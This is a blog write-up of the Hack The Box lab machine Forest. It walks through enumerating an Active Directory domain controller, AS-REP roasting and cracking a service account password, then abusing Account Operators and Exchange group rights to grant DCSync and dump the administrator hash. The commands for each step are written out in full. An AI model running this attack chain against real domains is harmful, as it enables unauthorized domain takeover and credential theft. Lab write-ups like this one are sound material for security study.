<!doctype html><html lang=en><head><title>Hack The Box: Forest ::</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=keywords content=","><meta name=robots content="noodp"><link rel=canonical href=https://blog.ikuamike.io/posts/2022/forest-htb/><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-202973704-2","auto"),ga("send","pageview"))</script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-202973704-2","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://blog.ikuamike.io/img/forest/logo-card.png"><meta name=twitter:title content="Hack The Box: Forest"><meta name=twitter:description content><meta name=twitter:site content="@ikuamike"><link rel=stylesheet href=https://blog.ikuamike.io/styles.css><link rel=stylesheet href=https://blog.ikuamike.io/css/style.css><link rel="shortcut icon" href=https://blog.ikuamike.io/img/theme-colors/green.png><link rel=apple-touch-icon href=https://blog.ikuamike.io/img/theme-colors/green.png><meta name=twitter:card content="summary_large_image"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Hack The Box: Forest"><meta property="og:description" content><meta property="og:url" content="https://blog.ikuamike.io/posts/2022/forest-htb/"><meta property="og:site_name" content><meta property="og:image" content="https://blog.ikuamike.io/"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:published_time" content="2022-03-01 00:00:00 +0000 UTC"></head><div id=particles-js></div><body class=green><div class="container center headings--one-size" style=background:#1f222a;z-index:1><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>> cd ~</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=https://blog.ikuamike.io/posts/2022/forest-htb/>Hack The Box: Forest</a></h1><div class=post-meta><time class=post-date>2022-03-01 ::</time></div><span class=post-tags>#<a href=https://blog.ikuamike.io/tags/learning-ad/>Learning AD</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/htb/>HTB</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/ldap/>LDAP</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/as-rep-roasting/>AS-REP Roasting</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/bloodhound/>BloodHound</a>&nbsp;</span><div class=table-of-contents><h2>Table of Contents</h2><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#enumeration>Enumeration</a><ul><li><a href=#ldap-null-bind>LDAP Null bind</a></li></ul></li><li><a href=#as-rep-roasting>AS-REP Roasting</a></li><li><a href=#shell-as-svc-alfresco>Shell as svc-alfresco</a><ul><li><a href=#domain-enumeration-with-bloodhound>Domain Enumeration with Bloodhound</a></li><li><a href=#account-operators-group>Account Operators Group</a></li><li><a href=#exchange-windows-permissions-group>Exchange Windows Permissions Group</a></li></ul></li><li><a href=#owning-the-domain>Owning the Domain</a></li><li><a href=#extras>Extras</a></li><li><a href=#references>References</a></li></ul></nav></div><div class=post-content><div><img src=/img/forest/logo.png class=center style=border-radius:8px><h2 id=introduction>Introduction<a href=#introduction class=hanchor arialabel=Anchor>&#8983;</a></h2><p>After passing my OSCP, I am planning on doing CRTP and CRTO sometime this year. I took the OSCP exam before the updates that are focused on Active
Directory so I didn&rsquo;t actively focus on this area.</p><p>So to learn and practice on AD and Windows and also as some prep for the certifications I plan on taking, I will be doing some machines that are AD
related and try to get into the details of the included misconfigurations and vulnerabilities.</p><p>For this writeup I am looking at Forest from HTB. There are many writeups on this so I will use them as references for learning.</p><h2 id=enumeration>Enumeration<a href=#enumeration class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Open ports as found by nmap.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.161
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.20s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT      STATE SERVICE      VERSION
</span></span><span style=display:flex><span>53/tcp    open  domain       Simple DNS Plus
</span></span><span style=display:flex><span>88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span style=color:#f92672>(</span>server time: 2022-02-25 16:32:33Z<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>135/tcp   open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span style=color:#f92672>(</span>Domain: htb.local, Site: Default-First-Site-Name<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>445/tcp   open  microsoft-ds Windows Server <span style=color:#ae81ff>2016</span> Standard <span style=color:#ae81ff>14393</span> microsoft-ds <span style=color:#f92672>(</span>workgroup: HTB<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>464/tcp   open  kpasswd5?
</span></span><span style=display:flex><span>593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>636/tcp   open  tcpwrapped
</span></span><span style=display:flex><span>3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span style=color:#f92672>(</span>Domain: htb.local, Site: Default-First-Site-Name<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>3269/tcp  open  tcpwrapped
</span></span><span style=display:flex><span>5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span style=color:#f92672>(</span>SSDP/UPnP<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title: Not Found
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style=display:flex><span>9389/tcp  open  mc-nmf       .NET Message Framing
</span></span><span style=display:flex><span>47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span style=color:#f92672>(</span>SSDP/UPnP<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title: Not Found
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style=display:flex><span>49664/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>49665/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>49666/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>49667/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>49671/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>49677/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>49684/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>49703/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>49945/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-time:
</span></span><span style=display:flex><span>|   date: 2022-02-25T16:33:28
</span></span><span style=display:flex><span>|_  start_date: 2022-02-25T16:25:55
</span></span><span style=display:flex><span>| smb2-security-mode:
</span></span><span style=display:flex><span>|   3.1.1:
</span></span><span style=display:flex><span>|_    Message signing enabled and required
</span></span><span style=display:flex><span>| smb-security-mode:
</span></span><span style=display:flex><span>|   account_used: &lt;blank&gt;
</span></span><span style=display:flex><span>|   authentication_level: user
</span></span><span style=display:flex><span>|   challenge_response: supported
</span></span><span style=display:flex><span>|_  message_signing: required
</span></span><span style=display:flex><span>|_clock-skew: mean: 2h52m14s, deviation: 4h37m09s, median: 12m13s
</span></span><span style=display:flex><span>| smb-os-discovery:
</span></span><span style=display:flex><span>|   OS: Windows Server <span style=color:#ae81ff>2016</span> Standard <span style=color:#ae81ff>14393</span> <span style=color:#f92672>(</span>Windows Server <span style=color:#ae81ff>2016</span> Standard 6.3<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   Computer name: FOREST
</span></span><span style=display:flex><span>|   NetBIOS computer name: FOREST<span style=color:#ae81ff>\x</span><span style=color:#ae81ff>00</span>
</span></span><span style=display:flex><span>|   Domain name: htb.local
</span></span><span style=display:flex><span>|   Forest name: htb.local
</span></span><span style=display:flex><span>|   FQDN: FOREST.htb.local
</span></span><span style=display:flex><span>|_  System time: 2022-02-25T08:33:27-08:00
</span></span></code></pre></div><p>From the results we see some notable ports (88,389) that point to us that this is a domain controller. From ldap we see the domain is <strong>htb.local</strong> and
from smb the computer name is <strong>FOREST</strong>.</p><h3 id=ldap-null-bind>LDAP Null bind<a href=#ldap-null-bind class=hanchor arialabel=Anchor>&#8983;</a></h3><p>LDAP null bind is allowed on this machine allowing us to make ldap queries without authentication. Something to note this is not a default configuration
for Windows AD, you have to set this up manually.</p><p>By running nmap ldap scripts against the machine alot of the ldap information is dumped. I have cut most off the output.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.161
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.20s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT    STATE SERVICE    VERSION
</span></span><span style=display:flex><span>389/tcp open  ldap       Microsoft Windows Active Directory LDAP <span style=color:#f92672>(</span>Domain: htb.local, Site: Default-First-Site-Name<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ldap-search:
</span></span><span style=display:flex><span>|   Context: DC<span style=color:#f92672>=</span>htb,DC<span style=color:#f92672>=</span>local
</span></span><span style=display:flex><span>|     dn: DC<span style=color:#f92672>=</span>htb,DC<span style=color:#f92672>=</span>local
</span></span><span style=display:flex><span>|         objectClass: top
</span></span><span style=display:flex><span>|         objectClass: domain
</span></span><span style=display:flex><span>|         objectClass: domainDNS
</span></span><span style=display:flex><span>|         distinguishedName: DC<span style=color:#f92672>=</span>htb,DC<span style=color:#f92672>=</span>local
</span></span><span style=display:flex><span>|         instanceType: <span style=color:#ae81ff>5</span>
</span></span><span style=display:flex><span>|         whenCreated: 2019/09/18 17:45:49 UTC
</span></span><span style=display:flex><span>|         whenChanged: 2022/02/25 16:25:45 UTC
</span></span><span style=display:flex><span>|         subRefs: DC<span style=color:#f92672>=</span>ForestDnsZones,DC<span style=color:#f92672>=</span>htb,DC<span style=color:#f92672>=</span>local
</span></span><span style=display:flex><span>|         subRefs: DC<span style=color:#f92672>=</span>DomainDnsZones,DC<span style=color:#f92672>=</span>htb,DC<span style=color:#f92672>=</span>local
</span></span><span style=display:flex><span>|         subRefs: CN<span style=color:#f92672>=</span>Configuration,DC<span style=color:#f92672>=</span>htb,DC<span style=color:#f92672>=</span>local
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>--- snip ---
</span></span></code></pre></div><p>We can also confirm this using ldapsearch and we see all ldap information.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>ldapsearch -h 10.10.10.161 -x -b <span style=color:#e6db74>&#34;DC=htb,DC=local&#34;</span> 
</span></span></code></pre></div><img src=/img/forest/forest1.png class=center style=border-radius:8px><p>Since the output is quite verbose and not easy to digest I&rsquo;ll use <strong>windapsearch</strong> which is a nicer tool that helps with ldap information.</p><h4 id=users>Users<a href=#users class=hanchor arialabel=Anchor>&#8983;</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>windapsearch -d htb.local --dc 10.10.10.161 -m users --attrs samaccountname | grep -i samaccountname | awk <span style=color:#e6db74>&#39;{print $2}&#39;</span>
</span></span></code></pre></div><pre tabindex=0><code>SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
Guest
DefaultAccount
SM_681f53d4942840e18
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1b41c9286325456bb
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
HealthMailbox83d6781
mark
lucinda
santi
andy
HealthMailboxfd87238
sebastien
</code></pre><h4 id=computers>Computers<a href=#computers class=hanchor arialabel=Anchor>&#8983;</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>windapsearch -d htb.local --dc 10.10.10.161 -m computers
</span></span></code></pre></div><pre tabindex=0><code>dn: CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
cn: FOREST
operatingSystem: Windows Server 2016 Standard
operatingSystemVersion: 10.0 (14393)
dNSHostName: FOREST.htb.local

dn: CN=EXCH01,CN=Computers,DC=htb,DC=local
cn: EXCH01
operatingSystem: Windows Server 2016 Standard
operatingSystemVersion: 10.0 (14393)
dNSHostName: EXCH01.htb.local
</code></pre><h4 id=groups>Groups<a href=#groups class=hanchor arialabel=Anchor>&#8983;</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>windapsearch -d htb.local --dc 10.10.10.161 -m groups | grep cn | awk -F<span style=color:#ae81ff>\:</span> <span style=color:#e6db74>&#39;{print $2}&#39;</span>  
</span></span></code></pre></div><pre tabindex=0><code>--- snip ---
Key Admins
Enterprise Key Admins
Organization Management
Recipient Management
UM Management
Help Desk
Discovery Management
Records Management
Public Folder Management
Server Management
View-Only Organization Management
Delegated Setup
Security Reader
Hygiene Management
Security Administrator
Compliance Management
Exchange Servers
Exchange Trusted Subsystem
Managed Availability Servers
Exchange Windows Permissions
ExchangeLegacyInterop
Exchange Install Domain Servers
test
</code></pre><p>We can go on and on with enumeration but you get the point. From the user accounts list and computers we can see presence of an
Exchange server in the domain, keep this in mind it will be important later.</p><p>At this point we don&rsquo;t yet have any actionable information that could help us get a foothold.</p><h2 id=as-rep-roasting>AS-REP Roasting<a href=#as-rep-roasting class=hanchor arialabel=Anchor>&#8983;</a></h2><p>This attack has been well covered on other posts online, I&rsquo;ll list ones that I like as references.</p><p>We&rsquo;ll use GetNPUsers script from impacket to perform the attack. This script also makes ldap queries to identify users vulnerable to
the attack.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>GetNPUsers.py -request -dc-ip 10.10.10.161 htb.local/
</span></span></code></pre></div><img src=/img/forest/forest2.png class=center style=border-radius:8px><p>Using the output, I was able to crack the hash with john and get the user&rsquo;s password.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>john --wordlist<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt svc-alfresco.txt
</span></span></code></pre></div><p><strong>svc-alfresco : s3rvice</strong></p><h2 id=shell-as-svc-alfresco>Shell as svc-alfresco<a href=#shell-as-svc-alfresco class=hanchor arialabel=Anchor>&#8983;</a></h2><p>With the discovered credentials we can get a shell, to confirm that we can use this user to get a shell I will use crackmapexec.</p><img src=/img/forest/forest3.png class=center style=border-radius:8px><p>CME confirms we can connect via winrm.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
</span></span></code></pre></div><p>Once we have a shell we can look at group memberships for this account.</p><img src=/img/forest/forest4.png class=center style=border-radius:8px><p>From the output we see we are part of several interesting non-default groups.</p><ol><li>Remote Management Users - Builtin</li><li>Account Operators - Builtin</li><li>Privileged IT Accounts - Custom</li><li>Service Accounts - Custom</li></ol><p>We know the Remote Management Users group is the one that allowed us winrm access.</p><h3 id=domain-enumeration-with-bloodhound>Domain Enumeration with Bloodhound<a href=#domain-enumeration-with-bloodhound class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Since this is a domain controller we can try to find the privilege escalation path using domain information. This is
where bloodhound will come in handy. If you haven&rsquo;t use bloodhound against your AD environment, you should!</p><blockquote><p>BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment.
Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify.</p><p>Source - BloodHound Github page</p></blockquote><p>I recommend you use <a href=https://github.com/BloodHoundAD/BloodHound/releases/tag/4.0.3 target=_blank rel=noopener>release 4.0.3</a>
. For some reason the latest release 4.1.0 (at the time
of writing) didn&rsquo;t work well for me.</p><p>All you need to do is upload SharpHound.exe to the Forest machine, execute it, download the created zip file and upload it to Bloodhound.</p><p>Once uploaded, search for our user svc-alfresco and mark them as owned.</p><img src=/img/forest/forest6.png class=center style=border-radius:8px><p>From there we can try uncover an possible attack path that will lead us to DA. The Pre-Built queries from BloodHound are quite useful. In our case the
<strong>&ldquo;Shortest Paths to Domain Admins from Owned Principals&rdquo;</strong> will give us a useful path.</p><img src=/img/forest/forest7.png class=center style=border-radius:8px><p>We will get the below graph showing the path to Domain Admin, I have rearranged the nodes for easier view.</p><img src=/img/forest/forest5.png class=center style=border-radius:8px><p>We see the <strong>Account Operators</strong> group has <em>GenericAll</em> permissions on <strong>Exchange Windows Permissions</strong> Group.</p><h3 id=account-operators-group>Account Operators Group<a href=#account-operators-group class=hanchor arialabel=Anchor>&#8983;</a></h3><p>By looking at <a href=https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#account-operators target=_blank rel=noopener>Microsoft documentation</a>
;</p><blockquote><p>The Account Operators group grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including those of users,
local groups, and global groups, and members can log in locally to domain controllers.</p><p>Members of the Account Operators group cannot manage the Administrator user account, the user accounts of administrators, or the Administrators, Server Operators, Account Operators,
Backup Operators, or Print Operators groups. Members of this group cannot modify user rights.</p></blockquote><p>From the above information, we see that the Account Operators group has permission to create and modify any groups except those listed. Since the Exchange Windows Permissions group
isn&rsquo;t part of this list, it becomes modifiable by default.</p><h3 id=exchange-windows-permissions-group>Exchange Windows Permissions Group<a href=#exchange-windows-permissions-group class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Remember the presence of Exchange? When installing Exchange, by default the permissions granted on the domain are too high (I think this is now patched on 2019 version, not sure). When Exchange
is installed, the Exchange Windows Permissions Group has WriteDACL access to the Domain.</p><p>See this article that goes in depth on the subject. <a href="https://adsecurity.org/?p=4119" target=_blank rel=noopener>https://adsecurity.org/?p=4119</a></p><p>The Exchange Trusted Subsystem Group can also be used as it is a member of the Exchange Windows Permissions Group.</p><p>Now we can chain these two issues to compromise the domain.</p><h2 id=owning-the-domain>Owning the Domain<a href=#owning-the-domain class=hanchor arialabel=Anchor>&#8983;</a></h2><p>First we&rsquo;ll use our Account Operator privileges as svc-alfresco to create an account and add it the Exchange Windows Permissions Group.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>net user pwned <span style=color:#e6db74>&#39;Pwn3d!!&#39;</span> /add
</span></span><span style=display:flex><span>net group <span style=color:#e6db74>&#34;Exchange Windows Permissions&#34;</span> pwned /add
</span></span></code></pre></div><p>We can then upload PowerView and use it to grant DCSync privileges to the newly created account.</p><p>The below commands will allow powerview to use the credentials of the new account to grant the privileges on that account.
We could also use the svc-alfresco account if we wanted.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>$SecPassword <span style=color:#f92672>=</span> ConvertTo-SecureString <span style=color:#e6db74>&#39;Pwn3d!!&#39;</span> -AsPlainText -Force
</span></span><span style=display:flex><span>$Cred <span style=color:#f92672>=</span> New-Object System.Management.Automation.PSCredential<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;htb.local\pwned&#39;</span>, $SecPassword<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Add-DomainObjectAcl -Credential $Cred -TargetDomain htb.local -PrincipalIdentity <span style=color:#e6db74>&#39;pwned&#39;</span> -Rights DCSync
</span></span></code></pre></div><p>With that being successful, we can perform DCSync with secretsdump impacket script and get the administrator hash.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>secretsdump.py htb.local/pwned:<span style=color:#e6db74>&#39;Pwn3d!!&#39;</span>@10.10.10.161
</span></span></code></pre></div><img src=/img/forest/forest9.png class=center style=border-radius:8px><p>We can then use the admin hash to get a shell.</p><h2 id=extras>Extras<a href=#extras class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Todo - LDAP queries</p><h2 id=references>References<a href=#references class=hanchor arialabel=Anchor>&#8983;</a></h2><p><strong>AS-REP Roasting</strong></p><p><a href=https://www.securitynik.com/2022/01/beginning-as-rep-roasting-with-impacket.html target=_blank rel=noopener>https://www.securitynik.com/2022/01/beginning-as-rep-roasting-with-impacket.html</a></p><p><a href=https://jsecurity101.medium.com/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec target=_blank rel=noopener>https://jsecurity101.medium.com/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec</a></p><p><a href=https://blog.xpnsec.com/kerberos-attacks-part-2/ target=_blank rel=noopener>https://blog.xpnsec.com/kerberos-attacks-part-2/</a></p><p><strong>Exchange and ACL Stuff</strong></p><p><a href=https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf target=_blank rel=noopener>https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf</a></p><p><a href=https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/ target=_blank rel=noopener>https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/</a></p><p><a href=https://support.microsoft.com/en-us/topic/reducing-permissions-required-to-run-exchange-server-when-you-use-the-shared-permissions-model-e1972d47-d714-fd76-1fd5-7cdcb85408ed target=_blank rel=noopener>https://support.microsoft.com/en-us/topic/reducing-permissions-required-to-run-exchange-server-when-you-use-the-shared-permissions-model-e1972d47-d714-fd76-1fd5-7cdcb85408ed</a></p><p><a href=https://pentestlab.blog/2019/09/12/microsoft-exchange-acl/ target=_blank rel=noopener>https://pentestlab.blog/2019/09/12/microsoft-exchange-acl/</a></p><p><a href=https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/ target=_blank rel=noopener>https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/</a></p><p><a href=https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md target=_blank rel=noopener>https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md</a></p><p><strong>Other Forest Walkthroughs</strong></p><p><a href=https://0xdf.gitlab.io/2020/03/21/htb-forest.html target=_blank rel=noopener>https://0xdf.gitlab.io/2020/03/21/htb-forest.html</a></p><p><a href="https://www.youtube.com/watch?v=H9FcE_FMZio&t=3755s" target=_blank rel=noopener>https://www.youtube.com/watch?v=H9FcE_FMZio&t=3755s</a></p><p><a href=https://vulndev.io/2020/03/21/forest-hackthebox/ target=_blank rel=noopener>https://vulndev.io/2020/03/21/forest-hackthebox/</a></p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button next"><a href=https://blog.ikuamike.io/posts/2021/metasploit_ctf_2021/><span class=button__text>Metasploit Community CTF 2021 WriteUp</span>
<span class=button__icon>→</span></a></span></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2024 Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div><script src=/js/vanilla-back-to-top.min.js></script>
<script>addBackToTop({diameter:40,backgroundColor:"rgb(120, 226, 160)",textColor:"#1F222A",cornerOffset:30})</script><script src=/js/particles.min.js></script>
<script>particlesJS("particles-js",{particles:{number:{value:80,density:{enable:!0,value_area:1e3}},color:{value:"#ffffff"},shape:{type:"circle",stroke:{width:0,color:"#000000"}},opacity:{value:.5,random:!1,anim:{enable:!1,speed:1,opacity_min:.1,sync:!1}},size:{value:2,random:!0,anim:{enable:!1,speed:4,size_min:.1,sync:!1}},line_linked:{enable:!0,distance:150,color:"#ffffff",opacity:.3,width:1},move:{enable:!0,speed:.5,direction:"none",random:!0,straight:!1,out_mode:"out",bounce:!1,attract:{enable:!1,rotateX:600,rotateY:1200}}},retina_detect:!0})</script></body></html>